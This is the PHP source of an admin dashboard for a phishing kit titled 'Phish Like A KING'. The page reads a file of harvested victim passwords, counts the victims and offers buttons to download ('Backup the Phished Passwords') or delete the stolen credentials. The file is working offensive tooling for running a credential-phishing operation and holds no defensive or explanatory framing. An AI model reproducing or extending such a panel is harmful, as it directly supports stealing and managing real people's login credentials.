<?php session_start(); /* Starts the session */

if(!isset($_SESSION['UserData']['Username'])){
	header("location:login.php");
	exit;
}
?>

<?php
$filename = "../victims/password.txt";
$searchFor = "password";
$fileContent = file_get_contents($filename);
$count = substr_count($fileContent, $searchFor);
echo'
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body {
  margin: 0;
  font-family:courier;
}

.sidebar {
  margin: 0;
  padding: 0;
  width: 200px;
  background-color: #f1f1f1;
  position: fixed;
  height: 100%;
  overflow: auto;
}

.sidebar a {
  display: block;
  color: black;
  padding: 16px;
  text-decoration: none;
}
 
.sidebar a.active {
  background-color: #4CAF50;
  color: white;
}

.sidebar a:hover:not(.active) {
  background-color: #555;
  color: white;
}

div.content {
  margin-left: 200px;
  padding: 1px 16px;
  height: 500px;
}

@media screen and (max-width: 700px) {
  .sidebar {
    width: 100%;
    height: auto;
    position: relative;
  }
  .sidebar a {float: left;}
  div.content {margin-left: 0;}
}

@media screen and (max-width: 400px) {
  .sidebar a {
    text-align: center;
    float: none;
  }
}
</style>
</head>
<body>

<div class="sidebar">

<h3><center><b>Phish Like A<br>KING</b></center></h3>

  <a class="active" href="./home.php"><b>Home</b></a>
  <a  href="./dashboard.php"><b>Links</b></a>
  <a  href="./advance/index.php"><b>Settings</b></a>
  <a href="./victims.php"><b>Victims</b></a>
  <a href="./logout.php"><b>Logout</b></a>
</div>
<header><center><br><img src=./logo.png width="300" height="60"><br><br></center> 


</header>
<hr style=";height:5px;
border: 2px dashed #000;">
</body>
<center>
<br>
<h1 style=font-size:40px;>WELCOME ADMIN</h1>
<br><br><br>
<strong>
<br><br><a href="./victims.php"><button style="background-color:#000;color:white;border:5px solid #FFF;text-align:center;height:80px;width:170px;"><b style="font-size:20px;font-family:courier;">Victims: '.$count.'</b></button></a><br><br><br><br><br><br><p style="font-size:20px;">
Backup the Phished Passwords</p><br><br>
<a href="../victims/password.txt" download>
<button style="background-color:#000;color:white;border:5px solid #FFF;text-align:center;height:80px;width:170px;"><b style="font-size:20px;font-family:courier;">Backup<br>Passwords</b></button>
</a>
<strong>
<br><br><br><br><p style="font-size:20px;">Delete All<br>Phished Credentials</p><br><br>
<a href="./clear_logs.php">
<button style="background-color:#000;color:white;border:5px solid #FFF;text-align:center;height:70px;width:140px;"><b><p style="font-family:courier;font-size:20px;">DELETE</b></p></button>
</a>
<br><br><br><br>
</center>
</html>';
?>